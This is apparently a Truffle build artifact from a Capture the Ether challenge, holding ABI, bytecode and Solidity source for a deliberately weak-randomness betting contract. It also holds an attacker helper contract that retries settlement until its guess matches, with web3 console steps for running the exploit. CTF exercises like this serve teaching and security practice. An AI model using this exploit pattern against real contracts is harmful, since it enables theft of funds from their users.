{
  "contractName": "PredictTheFutureChallenge",
  "abi": [
    {
      "inputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "n",
          "type": "uint8"
        }
      ],
      "name": "lockInGuess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "settle",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6060604052670de0b6b3a76400003414151561001a57600080fd5b610320806100296000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806311da60b41461005c5780632c0e005414610071578063b2fa1c9e1461008c575b600080fd5b341561006757600080fd5b61006f6100b9565b005b61008a600480803560ff1690602001909190505061020f565b005b341561009757600080fd5b61009f6102d3565b604051808215151515815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561011657600080fd5b6001544311151561012657600080fd5b600a6001430340426040518083600019166000191681526020018281526020019250505060405180910390206001900460ff1681151561016257fe5b06905060008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060ff16600060149054906101000a900460ff1660ff16141561020c573373ffffffffffffffffffffffffffffffffffffffff166108fc671bc16d674ec800009081150290604051600060405180830381858888f19350505050151561020b57600080fd5b5b50565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614151561025557600080fd5b670de0b6b3a76400003414151561026b57600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600060146101000a81548160ff021916908360ff1602179055506001430160018190555050565b6000803073ffffffffffffffffffffffffffffffffffffffff1631149050905600a165627a7a72305820fb1bed33dcbc71c8c17322c3dce21266fd925798a885f8d90e3057a7a48613f90029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n/*\r\nconst oneEth = web3.utils.toWei('1', 'ether');\r\nvar predictTheFutureChallenge = await PredictTheFutureChallenge.deployed();\r\nvar predictHelper = await PredictHelper.deployed();\r\n\r\nvar blockNumTarget = await web3.eth.getBlockNumber() + 2;\r\nawait web3.eth.getBlockNumber();\r\n(await predictHelper.getAnswer()).toNumber()\r\nawait predictHelper.lockInGuess(0, {from: accounts[0], value: oneEth});\r\nawait web3.eth.getBlockNumber();\r\nawait predictHelper.wasteBlock({from: accounts[0]});\r\nawait predictHelper.settle({from: accounts[0]});\r\nawait predictHelper.isComplete();\r\nawait web3.eth.getBalance(predictTheFutureChallenge.address)\r\n\r\n    address guesser;    // slot 0\r\n    uint8 guess;        // appended to slot 0\r\n    uint256 settlementBlockNumber;  // slot 1\r\n0x0000000000000000000000005c78abfd724f760734f301f0d08a7741ff73f6da\r\n0x0000000000000000000000000000000000000000000000000000000000adecdf\r\n0x0000000000000000000000000000000000000000000000000000000000000000\r\n*/\r\n\r\n// essential reading: https://solidity-by-example.org/hacks/accessing-private-data/\r\n\r\ncontract PredictHelper is OtherContract {\r\n    uint8 public waste;\r\n    uint8 guess;\r\n    uint256 settlementBlockNumber;\r\n\r\n    function getGuess() public view returns (uint8) {\r\n        return guess;\r\n    }\r\n\r\n    function getSettlementBlockNumber() public view returns (uint256) {\r\n        return settlementBlockNumber;\r\n    }\r\n\r\n    function getAnswer() public view returns (uint8) {\r\n        return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\r\n    }\r\n\r\n    function wasteBlock() public {\r\n        waste += 1;\r\n    }\r\n\r\n    function() public payable { \r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);\r\n        return predictTheFutureChallenge.isComplete();\r\n    }\r\n    \r\n    function lockInGuess(uint8 n) public payable {\r\n        require(otherContract != 0);\r\n        guess = n;\r\n        settlementBlockNumber = block.number + 1;\r\n        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);\r\n        predictTheFutureChallenge.lockInGuess.value(1 ether)(n);\r\n    }\r\n\r\n    event SettleAttempt(uint8 calculatedAnswer, uint8 lockedInGuess);\r\n\r\n    function settle() public returns (uint8 calculatedAnswer, uint8 lockedInGuess) {\r\n        require(otherContract != 0);\r\n        uint8 answer = getAnswer();\r\n        calculatedAnswer = answer;\r\n        lockedInGuess = guess;\r\n        emit SettleAttempt(calculatedAnswer, lockedInGuess);\r\n\r\n        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);\r\n        predictTheFutureChallenge.settle();\r\n        require(predictTheFutureChallenge.isComplete() == true);\r\n        require(answer == guess);\r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n}\r\n\r\n/*\r\n# Storage\r\n- 2 ** 256 slots\r\n- 32 bytes for each slot\r\n- data is stored sequentially in the order of declaration\r\n- storage is optimized to save space. If neighboring variables fit in a single\r\n  32 bytes, then they are packed into the same slot, starting from the right\r\n*/\r\n\r\ncontract PredictTheFutureChallenge {\r\n    address guesser;    // slot 0\r\n    uint8 guess;        // appended to slot 0\r\n    uint256 settlementBlockNumber;  // slot 1\r\n\r\n    function PredictTheFutureChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function lockInGuess(uint8 n) public payable {\r\n        require(guesser == 0);\r\n        require(msg.value == 1 ether);\r\n\r\n        guesser = msg.sender;\r\n        guess = n;\r\n        settlementBlockNumber = block.number + 1;\r\n    }\r\n\r\n    function settle() public {\r\n        require(msg.sender == guesser);\r\n        require(block.number > settlementBlockNumber);\r\n\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\r\n\r\n        guesser = 0;\r\n        if (guess == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\PredictTheFutureChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-13T00:45:09.117Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}